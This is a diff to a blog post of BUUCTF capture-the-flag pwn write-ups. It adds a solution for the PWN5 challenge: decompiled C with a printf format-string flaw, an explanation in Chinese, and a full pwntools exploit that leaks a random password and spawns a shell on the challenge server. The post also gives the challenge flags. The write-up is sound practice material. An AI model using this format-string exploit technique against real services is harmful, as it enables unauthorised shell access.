@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: BUUCTF"
 published: 2025-07-05
-updated: 2025-07-06
+updated: 2025-07-07
 description: "Write-ups for BUUCTF's pwn aspect."
 image: "./covers/buuctf.png"
 tags: ["Pwn", "Write-ups"]
@@ -489,3 +489,121 @@ if __name__ == "__main__":
 ## Flag
 
 Flag: `flag{05ce7df6-bb73-4445-9abd-b107d55cede1}`
+
+# [第五空间 2019 决赛] PWN5
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+```c del={19, 21} ins={23-28}
+int __cdecl main(int a1)
+{
+  time_t v1; // eax
+  int result; // eax
+  int fd; // [esp+0h] [ebp-84h]
+  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
+  char buf[100]; // [esp+14h] [ebp-70h] BYREF
+  unsigned int v6; // [esp+78h] [ebp-Ch]
+  int *v7; // [esp+7Ch] [ebp-8h]
+
+  v7 = &a1;
+  v6 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  v1 = time(0);
+  srand(v1);
+  fd = open("/dev/urandom", 0);
+  read(fd, &dword_804C044, 4u);
+  printf("your name:");
+  read(0, buf, 0x63u);
+  printf("Hello,");
+  printf(buf);
+  printf("your passwd:");
+  read(0, nptr, 0xFu);
+  if ( atoi(nptr) == dword_804C044 )
+  {
+    puts("ok!!");
+    system("/bin/sh");
+  }
+  else
+  {
+    puts("fail");
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v6 )
+    sub_80493D0();
+  return result;
+}
+```
+
+核心逻辑是判断 `atoi(nptr) == dword_804C044`，因此只要我们需要知道 `dword_804C044` 的值，就可以拿到 `shell`。
+
+这题完全就是考了个格式化字符串漏洞，`read(fd, &dword_804C044, 4u);` 将随机数读取到 `bss` 段，所以我们只要想办法泄漏 `bss` 中保存的 `dword_804C044` 的值就好了。`dword_804C044` 的地址可以通过 `bss` 段基地址加上 debug 出来的数据偏移计算得到。把泄漏的地址和格式化字符串一起作为输入发送，用 `%s` 来输出栈上保存的地址所指向的值。
+
+## Exploit
+
+```python
+#!/usr/bin/python
+
+from pwn import args, context, flat, gdb, process, remote, u32
+
+gdbscript = """
+b *0x80492bc
+b *0x80492f0
+c
+"""
+
+FILE = "./pwn"
+HOST, PORT = "node5.buuoj.cn", 26163
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+    if args.D:
+        gdb.attach(target, gdbscript=gdbscript)
+
+    return target
+
+
+def rev_atoi(data):
+    return str(u32(data)).encode()
+
+
+def construct_payload():
+    elf = context.binary
+
+    payload = flat(b"aa%12$s\x00", elf.bss() + 0x4)
+
+    return payload
+
+
+def main():
+    target = launch()
+
+    payload = construct_payload()
+
+    target.sendlineafter(b"your name:", payload)
+    target.recvuntil(b"aa")
+
+    passwd = rev_atoi(target.recv(0x4))
+
+    target.sendlineafter(b"your passwd:", passwd)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+Flag: `flag{a375d1c7-b6dc-4b93-bb5e-9ba59d14060a}`
